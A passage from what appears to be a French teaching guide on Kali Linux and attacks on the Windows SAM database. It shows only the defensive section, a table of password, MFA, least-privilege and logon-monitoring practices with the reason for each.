de protection (perspective d\u00e9fensive)","text":"<p>Ce laboratoire met en \u00e9vidence l'importance des bonnes pratiques de s\u00e9curit\u00e9 :</p> Bonne pratique Raison Mots de passe longs (16+ caract\u00e8res) Rend la force brute impraticable Mots de passe complexes et uniques R\u00e9siste aux dictionnaires et aux r\u00e8gles D\u00e9sactiver LM Hash (d\u00e9j\u00e0 le cas sur Win Vista+) LM est trivial \u00e0 craquer Activer Windows Hello / MFA Rend le hash inutile sans le second facteur Principe du moindre privil\u00e8ge Limite l'impact d'un compte compromis Surveillance des \u00e9v\u00e9nements 4624/4625 D\u00e9tecte les tentatives de connexion suspectes <p>Guide Kali Linux &amp; Attaque SAM \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 Usage p\u00e9dagogique uniquement \u00b7 2025</p>"}]}